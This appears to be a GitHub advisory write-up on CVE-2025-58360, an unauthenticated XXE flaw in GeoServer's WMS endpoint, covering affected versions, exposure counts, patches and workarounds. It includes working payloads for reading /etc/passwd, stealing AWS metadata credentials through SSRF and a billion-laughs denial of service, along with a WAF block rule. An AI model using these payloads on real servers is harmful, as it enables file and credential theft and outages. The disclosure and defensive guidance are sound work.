# ğŸ”“ ğŸ›°ï¸ 'CVE-2025-58360' GeoServer WMS Endpoint Vulnerable to XXE Attack ğŸŒŸ

![GeoServer](https://github.com/user-attachments/assets/5d271d0c-f79d-40ec-a3c5-9ea19db16fd9)

### ğŸ·ï¸ Basic Information  
- **CVE ID**: CVE-2025-58360  
- **Published**: ğŸ“… November 25, 2025  
- **Last Modified**: ğŸ“… November 25, 2025 (still fresh as of Nov 26)  
- **Vulnerability Type**: XML External Entity (XXE) â€“ CWE-611  
- **Affected Software**: GeoServer (open-source geospatial server written in Java)  
- **Severity**: ğŸ”¥ **High** â€“ CVSS v3.1 Base Score **7.5**  
  - Vector: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L`  
- **Exploitation in the Wild**: ğŸŸ¡ Not yet observed (Nov 26, 2025) â€“ but public PoCs are circulating  
- **Authentication Required**: âŒ None â€“ fully unauthenticated  
- **User Interaction Required**: âŒ None  

### ğŸ¨ What Makes This Bug Special (and Dangerous)  
This is a **classic but devastating XXE** in the Web Map Service (WMS) GetMap endpoint.  
Attackers can:  
- ğŸ“‚ Read **any file** the GeoServer process has access to (`/etc/passwd`, `geoserver.xml`, private keys, etc.)  
- ğŸŒ Perform **Server-Side Request Forgery (SSRF)** to scan internal networks or hit metadata endpoints (e.g., AWS/GCP)  
- ğŸ’£ Trigger **Denial-of-Service** with entity-expansion attacks (â€œbillion laughsâ€)  
- ğŸ”— Potentially chain with other flaws for full RCE (not direct, but possible in misconfigured setups)

### ğŸ›¡ï¸ Affected Versions (Detailed Table)  
| Component                          | Vulnerable Versions                          | Fixed In                     | Status       |
|------------------------------------|----------------------------------------------|------------------------------|--------------|
| GeoServer Standalone               | 2.26.0 â€“ 2.26.1<br>â‰¤ 2.25.5                  | 2.26.3, 2.25.6, 2.27.0       | ğŸ”´ Vulnerable |
| Docker (osgeo/geoserver)           | 2.26.0 â€“ 2.26.1<br>â‰¤ 2.25.5                  | 2.26.2+, 2.27.0              | ğŸ”´ Vulnerable |
| Maven org.geoserver:gs-wms         | 2.26.0 â€“ 2.26.1<br>â‰¤ 2.25.5                  | 2.26.2+, 2.25.6              | ğŸ”´ Vulnerable |
| Maven org.geoserver.web:gs-web-app | 2.26.0 â€“ 2.26.1<br>â‰¤ 2.25.5                  | 2.26.2+, 2.25.6              | ğŸ”´ Vulnerable |
| GeoServer 2.27.x and newer         | â€“                                            | Already patched              | âœ… Safe       |

### ğŸŒ Global Exposure (Real-time as of Nov 26, 2025)  
| Source         | Exposed Instances | Notes |
|----------------|-------------------|-------|
| ZoomEye        | ~49,400           | `app:"GeoServer"` search |
| FOFA           | ~24,000           | Past-year results |
| Shodan         | ~31,000           | Port 8080 + title match |
| GobySec        | ~20,000           | Public network scan |

â†’ Thatâ€™s **tens of thousands** of potentially vulnerable servers sitting on the open internet right now! ğŸŒ

### ğŸ§¨ Full Technical Exploit Walkthrough  
**Endpoint**: `POST /geoserver/wms`  
**Key Parameter**: `SLD_BODY` (allows raw XML styling)  
**Vulnerable Code Path**: The XML parser does **not** disable external entity resolution â†’ classic XXE.

![f77f64d7c92fd31b29d537f5205da524](https://github.com/user-attachments/assets/dfcad8ff-65fc-46ef-9a37-093eab64a8e9)

#### Example 1 â€“ File Disclosure (/etc/passwd)  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<sld:StyledLayerDescriptor xmlns:sld="http://www.opengis.net/sld" version="1.0.0">
  <sld:UserLayer>
    <sld:LayerFeatureConstraints>
      <sld:FeatureTypeConstraint>&xxe;</sld:FeatureTypeConstraint>
    </sld:LayerFeatureConstraints>
  </sld:UserLayer>
</sld:StyledLayerDescriptor>
```
â†’ Response contains the contents of `/etc/passwd` ğŸ‰

#### Example 2 â€“ SSRF to Internal Metadata (AWS example)  
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```
â†’ Leaks temporary AWS credentials if running on EC2.

#### Example 3 â€“ Billion Laughs DoS  
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- repeat up to lol9 -->
]>
<lol>&lol9;</lol>
```
â†’ Consumes gigabytes of RAM in seconds ğŸ’¥

### ğŸ› ï¸ Official Patches & Downloads  
| Version   | Release Date     | Download Link                                      |
|-----------|------------------|----------------------------------------------------|
| 2.27.0    | Nov 25, 2025     | https://geoserver.org/release/stable/              |
| 2.26.3    | Nov 25, 2025     | Maintenance branch patch                           |
| 2.25.6    | Nov 25, 2025     | Older supported branch                             |

Docker users:  
```bash
docker pull osgeo/geoserver:2.27.0
```

### ğŸ”§ Workarounds (if you canâ€™t patch immediately)  
1. **Block dangerous XML** with WAF/mod_security rule:  
   Deny requests containing `<!ENTITY` or `SYSTEM "file://`  
2. **Disable SLD_BODY** parameter globally (if not needed)  
3. **Run GeoServer with read-only filesystem** + drop capabilities  
4. **Put behind reverse proxy** that strips XML bodies for unauthenticated users

### ğŸ“¢ Official References & PoCs  
- NVD Entry: https://nvd.nist.gov/vuln/detail/CVE-2025-58360  
- GeoServer Advisory: https://github.com/geoserver/geoserver/security/advisories/GHSA-fjf5-xgmq-5525  
- JIRA Ticket: https://osgeo-org.atlassian.net/browse/GEOS-11682  
- Public Safe PoC (Python): https://gist.github.com/bolhasec/32fa035354d7cc9417aa297e2fe22b30  
- Nuclei Template (auto-detection): Already merged into main branch  

### â° Timeline  
| Date              | Event |
|-------------------|-------|
| Before Nov 2025   | Discovered autonomously by XBOW AI scanner |
| Nov 25, 2025      | Coordinated disclosure â†’ patches released |
| Nov 25, 2025      | CVE assigned & published |
| Nov 26, 2025      | PoCs go viral, exposure scans spike |

### âœ¨ Final Words  
This is a **textbook XXE** that hits a widely deployed geospatial platform with **tens of thousands** of internet-facing instances.  
Patches dropped the same day as disclosure â€” huge props to the GeoServer team for speed! ğŸ†  
But the window between patch availability and mass exploitation is shrinking fast.

**If you run GeoServer â†’ upgrade today.**  
Donâ€™t become the next headline.  

Stay secure, stay shiny! ğŸ›¡ï¸âœ¨
